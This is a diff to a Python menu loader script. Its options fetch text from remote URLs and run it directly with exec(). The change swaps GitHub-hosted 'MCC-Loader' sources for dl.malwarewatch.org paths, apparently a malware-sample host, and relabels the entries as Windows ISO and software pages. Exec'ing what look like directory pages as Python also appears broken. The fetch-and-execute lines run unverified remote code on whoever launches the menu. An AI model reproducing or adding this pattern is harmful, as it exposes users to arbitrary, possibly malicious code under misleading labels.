@@ -62,12 +62,12 @@ while True:
     chon = Write.Input("           [×] >>  ", Colors.red_to_purple, interval=0.0025)
     if chon == '1':
         os.system('cls')
-        print("                                              \033[1;39mLoading Minecraft Page..")
-        exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Minecraft').text)
+        print("                                              \033[1;39mLoading Windows Iso Page..")
+        exec(requests.get('https://dl.malwarewatch.org/windows/').text)
     if chon == 'SS':
         os.system('cls')
-        print("                                            \033[1;39mLoading Screen Share Tools Page..")
-        exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/SSTool').text)
+        print("                                            \033[1;39mLoading Software Page..")
+        exec(requests.get('https://dl.malwarewatch.org/software/').text)
     if chon == 'c':
         os.system('cls')
         print("                                                  \033[1;39mRendering Credits..")
